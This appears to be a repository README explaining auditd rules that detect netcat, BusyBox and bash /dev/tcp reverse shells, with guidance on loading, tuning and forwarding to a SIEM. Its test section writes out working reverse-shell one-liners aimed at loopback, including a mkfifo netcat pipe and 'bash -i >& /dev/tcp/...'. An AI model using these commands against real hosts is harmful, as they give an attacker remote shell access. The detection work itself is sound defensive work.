# Implementation notes for revsh_netcat_bash.rules with auditd

Create /etc/audit/rules.d/revsh_netcat_bash.rules with the rule file from this repo, then load them with augenrules --load (or reboot).

<br>**Notes** 

• These rules log execve of suspicious programs and connect socket syscalls made by those programs, which is what actually establishes the reverse shell.

• They include arch=b64 and arch=b32 (for completeness on multilib systems).

• The uid>=1000/uid!=4294967295 filters reduce noise by focusing on real, logged-in users (adjust as you like).

• Paths for nc/netcat vary; keep the ones you have and delete the rest.

* Initially I wrote these rules using ```uid``` and changed to using ```auid```, one reason is that auditd on ubuntu 20.04 didn't seem to recognize uid (maybe it was an old capability) and would error on the rules and not start until I changed to using ```auid```. Here is the difference between ```uid``` and ```auid```:

    * uid = effective UID at the moment of the syscall (can be 0 under sudo).

    * auid = original login ID (sticky across privilege changes).

    * For security auditing (who initiated it), auid is usually preferred. Using uid can miss or misattribute activity done via sudo/setuid.

<br>**Load and Verify the rules**

```bash
sudo augenrules --load
sudo auditctl -l | egrep 'revshell|busybox|ncat|netcat|bash'
```
<br>**Restart auditd service**

```bash
systemctl restart auditd
```


<br>**Why these rules work (logic)**

**A.** Execve of suspicious binaries

* A reverse shell typically begins with execution of a helper (e.g., nc) or an interactive shell (bash -i).

* The execve rules (keys: revshell_nc_exec, revshell_bash_exec) ensure you can see who launched them, how, and the full proctitle (arguments).

* We filter by uid>=1000 to focus on logins / non-system accounts (tune as needed).

**B.** Network connection creation by those binaries

* The key behavioral step is the connect(2) syscall to a remote host/port to establish the back-connection.

* The connect rules scoped to exe=/usr/bin/bash catch /dev/tcp/host/port reverse shells from bash.

* The connect rules scoped to nc/ncat/netcat/busybox catch typical netcat dial-outs (keys like revshell_nc_net).

**C.** Why not filter directly on arguments?

* Kernel-level audit filtering does not reliably match argv strings. Instead, log the exec and then inspect proctitle in the event (decoded via ausearch -i) to see things like -i, -e /bin/bash, or /dev/tcp/….

<br>**How to test (two realistic scenarios)**

In all tests, open another terminal and run the ausearch commands to watch events come in live (or shortly after). All audit logs land in /var/log/audit/audit.log.

<br>**Test 1 — Netcat reverse shell (local loopback)**

Start a local listener (terminal A):

```
nc -lv 4444
```

From a user account with uid>=1000 (terminal B), simulate a reverse shell to localhost:

```
# common variants; try one that exists on your system
nc 127.0.0.1 4444 -e /bin/bash         # GNU nc or OpenBSD nc with -e support
# or (OpenBSD nc without -e) use a FIFO trick:
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f
```

Verify audit hits:

```
# The exec of nc:
ausearch -k revshell_nc_exec -i | tail -n +1

# The outbound connect() by nc:
ausearch -k revshell_nc_net -i | tail -n +1
```

You should see records with fields for exe, proctitle (showing args), uid/auid, pid/ppid, and for the connect syscall, the destination address/port (as socket address data).

<br>**Test 1 — Bash /dev/tcp reverse shell (local loopback)**

Start a local listener (terminal A):

```
nc -lv 4445
```

Launch a classic /dev/tcp reverse shell (terminal B):

```
bash -i >& /dev/tcp/127.0.0.1/4445 0>&1
```

Verify audit hits:

```
# The exec of bash:
ausearch -k revshell_bash_exec -i | tail -n +1

# The outbound connect() made by bash:
ausearch -k revshell_bash_net -i | tail -n +1
```

Tip: ausearch -i decodes the proctitle so you can see bash -i clearly. Without -i, arguments may appear hex/NULL-separated.


<br>**Practical triage & tuning**

<br>**1. Reduce noise on servers**

If service accounts legitimately run nc (rare), pin to specific users or exclude them:
```
# Example: ignore the backup user
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/nc -F uid!=backup -k revshell_nc_exec
```

<br>**2. Tighten to outbound only**
<br>If you only care about outbound reverse shells, keep just the -S connect rules.

<br>**3. Forward to SIEM**
<br>Use **audispd-plugins** (e.g., **audisp-syslog** or **auditbeat**, or can use agents) to forward to Splunk/ELK.
In Splunk, search on index=auditd (key=revshell_* OR proctitle="*bash -i*" OR proctitle="* -e /bin/bash*").

<br>**Quick summary of keys that will be in logs**

* ```revshell_nc_exec``` — someone executed nc/ncat/netcat.

* ```revshell_nc_net``` — that binary called connect(2) to a remote endpoint.

* ```revshell_bash_exec``` — someone executed bash (inspect proctitle for -i).

* ```revshell_bash_net``` — bash itself created a network connection (likely /dev/tcp/... usage).

* ```revshell_busybox_*``` — same ideas for BusyBox.

This combination provides both the intent (exec + arguments) and the action (the outbound connect), which is a robust way to spot reverse shells in practice.
